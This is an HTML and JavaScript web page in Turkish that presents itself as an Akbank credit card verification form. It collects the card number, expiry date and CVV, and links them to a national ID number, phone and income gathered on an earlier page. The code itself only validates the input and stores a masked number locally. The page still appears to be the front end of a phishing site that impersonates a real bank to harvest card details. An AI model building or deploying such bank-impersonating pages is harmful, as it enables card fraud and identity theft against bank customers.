<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Akbank Kredi Kartı Doğrulama</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 30px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
        }
        header {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo {
            background-color: #e31837;
            color: white;
            font-size: 24px;
            font-weight: bold;
            padding: 10px 20px;
            border-radius: 5px;
            display: inline-block;
        }
        h1 {
            color: #e31837;
            margin-top: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #e31837;
        }
        button {
            background-color: #e31837;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        button:hover {
            background-color: #c41230;
        }
        .error {
            color: #e31837;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">Akbank</div>
            <h1>Kredi Kartı Doğrulama</h1>
        </header>

        <form id="cardVerificationForm">
            <div class="form-group">
                <label for="cardNumber">Kredi Kartı Numarası</label>
                <input type="text" id="cardNumber" maxlength="19" placeholder="XXXX XXXX XXXX XXXX">
                <div id="cardNumberError" class="error">Geçerli bir kredi kartı numarası giriniz.</div>
            </div>
            
            <div class="form-group">
                <label for="expDate">Son Kullanma Tarihi</label>
                <input type="text" id="expDate" maxlength="5" placeholder="AA/YY">
                <div id="expDateError" class="error">Geçerli bir son kullanma tarihi giriniz.</div>
            </div>
            
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" maxlength="3" placeholder="XXX">
                <div id="cvvError" class="error">Geçerli bir CVV giriniz.</div>
            </div>
            
            <button type="button" id="submitBtn">Başvuruyu Tamamla</button>
        </form>
    </div>

    <script>
        // Sayfanın yüklenmesi durumunda form verilerini kontrol et
        window.addEventListener('load', function() {
            const applicationData = localStorage.getItem('applicationData');
            
            // Eğer veri yoksa ana sayfaya yönlendir
            if (!applicationData) {
                alert('Lütfen önce kişisel bilgilerinizi girin.');
                window.location.href = 'index.html';
            }
        });
        
        // Luhn algoritması ile kredi kartı doğrulama
        function validateCreditCard(value) {
            // Boşlukları kaldır
            value = value.replace(/\s/g, '');
            
            if (!/^\d{16}$/.test(value)) {
                return false;
            }
            
            // Luhn algoritması
            let sum = 0;
            let double = false;
            
            for (let i = value.length - 1; i >= 0; i--) {
                let digit = parseInt(value.charAt(i));
                
                if (double) {
                    digit *= 2;
                    if (digit > 9) {
                        digit -= 9;
                    }
                }
                
                sum += digit;
                double = !double;
            }
            
            return sum % 10 === 0;
        }
        
        // Son kullanma tarihi doğrulama
        function validateExpDate(value) {
            if (!/^\d{2}\/\d{2}$/.test(value)) {
                return false;
            }
            
            const [month, year] = value.split('/').map(Number);
            const currentDate = new Date();
            const currentYear = currentDate.getFullYear() % 100;
            const currentMonth = currentDate.getMonth() + 1;
            
            if (month < 1 || month > 12) {
                return false;
            }
            
            if (year < currentYear || (year === currentYear && month < currentMonth)) {
                return false;
            }
            
            return true;
        }
        
        // CVV doğrulama
        function validateCVV(value) {
            return /^\d{3}$/.test(value);
        }
        
        // Format kredi kartı numarası (boşluk ekle)
        document.getElementById('cardNumber').addEventListener('input', function() {
            let value = this.value.replace(/\s/g, '');
            let formattedValue = '';
            
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            
            this.value = formattedValue;
        });
        
        // Format son kullanma tarihi (/ ekle)
        document.getElementById('expDate').addEventListener('input', function() {
            let value = this.value.replace(/\D/g, '');
            
            if (value.length > 2) {
                this.value = value.substring(0, 2) + '/' + value.substring(2, 4);
            } else {
                this.value = value;
            }
        });
        
        // CVV sadece sayı girişi
        document.getElementById('cvv').addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });
        
        // Form onaylama ve başvuru tamamlama
        document.getElementById('submitBtn').addEventListener('click', function() {
            const cardNumber = document.getElementById('cardNumber').value.trim();
            const expDate = document.getElementById('expDate').value.trim();
            const cvv = document.getElementById('cvv').value.trim();
            let hasError = false;
            
            // Kredi kartı doğrulama
            if (!validateCreditCard(cardNumber.replace(/\s/g, ''))) {
                document.getElementById('cardNumberError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('cardNumberError').style.display = 'none';
            }
            
            // Son kullanma tarihi doğrulama
            if (!validateExpDate(expDate)) {
                document.getElementById('expDateError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('expDateError').style.display = 'none';
            }
            
            // CVV doğrulama
            if (!validateCVV(cvv)) {
                document.getElementById('cvvError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('cvvError').style.display = 'none';
            }
            
            if (!hasError) {
                // Başvuru numarası oluştur
                const applicationNumber = 'AKB' + Date.now().toString().substring(5);
                localStorage.setItem('applicationNumber', applicationNumber);
                
                // Uygulama verilerini al
                const applicationData = JSON.parse(localStorage.getItem('applicationData'));
                
                // Başvuru bilgilerini kaydet
                const application = {
                    applicationNumber: applicationNumber,
                    tcno: applicationData.tcno,
                    phone: applicationData.phone,
                    income: applicationData.income,
                    hasCard: 'Evet',
                    cardNumber: cardNumber.substring(0, 4) + ' **** **** ' + cardNumber.substring(15),
                    date: new Date().toLocaleString()
                };
                
                // Mevcut başvuruları al
                let applications = [];
                const storedApplications = localStorage.getItem('applications');
                if (storedApplications) {
                    applications = JSON.parse(storedApplications);
                }
                
                // Yeni başvuruyu ekle
                applications.push(application);
                localStorage.setItem('applications', JSON.stringify(applications));
                
                // Başarı sayfasına yönlendir
                window.location.href = 'success.html';
            }
        });
    </script>
</body>
</html>
